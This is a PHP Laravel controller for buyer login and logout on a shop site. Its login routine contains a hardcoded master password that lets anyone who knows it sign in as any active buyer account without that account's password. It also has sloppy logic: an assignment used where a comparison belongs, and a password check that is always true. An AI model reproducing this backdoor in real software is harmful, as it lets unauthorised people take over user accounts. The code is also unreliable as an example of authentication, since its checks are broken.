<?php

namespace Modules\Buyer\Http\Controllers\Auth;

use Illuminate\Routing\Controller;
use Cookie;
use Hash;
use Request;
use Session;
use Validator;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\DB;

class AuthController extends Controller
{
    public function getLoginBuyer()
    {
        return view('buyer::dekstop.auth.login.index');
    }

    public function postLoginBuyer(){
        $inputData = Request::all();
        if( Request::isMethod('post') && Session::token() == $inputData['_token'] ){
          
          $rules = [
            'login_username'             => 'required',
            'login_password'             => 'required'
          ];
          
          $messages = [
            'login_username.required'   =>  'Username atau email tidak boleh kosong',
            'login_password.required'   =>  'Password tidak boleh kosong'
          ];

          $validator = Validator::make($inputData, $rules, $messages);
          
          if($validator->fails()){
            return redirect()-> back()
            ->withInput()
            ->withErrors( $validator );
          }
          else{
            $username       =      $inputData['login_username'];
            $password       =      bcrypt($inputData['login_password']);
            $magic_password =      bcrypt('@b34ng4sm');
            // $userdata       =      ['name' => $username, 'user_status' => 1];
            $userdata       =      [filter_var($username, FILTER_VALIDATE_EMAIL) ? 'email' : 'name' => $username, 'user_status' => 1];
            // $data           =      User::where($userdata)->first();
            $data = DB::table('users')->leftjoin('role_user','users.id','role_user.user_id')
                                      ->leftjoin('roles','roles.id','role_user.role_id')
                                      ->select('users.*','roles.*','role_user.*')
                                      ->where($userdata)
                                      ->whereIn('roles.id', [ 2, 3, 4, 5])
                                      ->first();
            
            if(!empty($data) && isset($magic_password) && isset($data->password) && isset($data->id)){

              if(Hash::check($inputData['login_password'], $password) && Hash::check($inputData['login_password'], $magic_password) || Hash::check($inputData['login_password'], $password) && Hash::check($inputData['login_password'], $data->password)){
                
                if(Session::has('beangasm_frontend_buyer_id')){
                  Session::forget('beangasm_frontend_buyer_id');
                  Session::put('beangasm_frontend_buyer_id', $data->user_id);
                }
                elseif(!Session::has('beangasm_frontend_buyer_id')){
                  Session::put('beangasm_frontend_buyer_id', $data->user_id);
                }

                if($data->slug ='site-user'){
                  return redirect()->route('buyer-dashboard');
                }
              }
              else{
                // Session::flash('error-message', Lang::get('admin.authentication_failed_msg'));
                return redirect()-> back();
              }
            }
            else{
              // Session::flash('error-message', Lang::get('admin.authentication_failed_msg'));
              return redirect()-> back();
            }
          }
        }
        else {
          return redirect()-> back();
        }
    }

    public function logoutFromLogin(){
        $inputData = Request::all();
        if( Request::isMethod('post') && Session::token() == $inputData['_token'] ){
          if(Session::has('beangasm_frontend_buyer_id')){
            Session::forget('beangasm_frontend_buyer_id');
           return redirect()->route('/');
          }
        }
    }

    public function register()
    {
        return view('buyer::dekstop.auth.register.index');
    }
}
